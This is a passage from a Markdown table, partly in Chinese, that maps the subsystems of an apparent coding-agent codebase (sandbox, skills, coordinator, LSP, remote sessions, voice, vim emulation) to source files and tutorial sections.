| **Sandbox** | `src/utils/bash/sandbox-adapter.ts` + `utils/permissions/pathValidation.ts` | 沙箱白名单 + denyWrite | s23 |
| **Skills** | `src/skills/` | `bundledSkills.ts`, `loadSkillsDir.ts`, `mcpSkills.ts` | s05/s21 |
| **Coordinator** | `src/coordinator/coordinatorMode.ts` | ~19000 tokens | (未覆盖) |
| **LSP** | `src/services/lsp/` | `LSPServerManager.ts`, `LSPClient.ts` | (未覆盖) |
| **Remote** | `src/remote/` | `RemoteSessionManager.ts`, `SessionsWebSocket.ts` | (未覆盖) |
| **Voice** | `src/services/voice/` | `voice.ts`, `voiceStreamSTT.ts` | (未覆盖) |
| **Vim** | `src/vim/` | 完整 vim 模拟 | (未覆盖) |
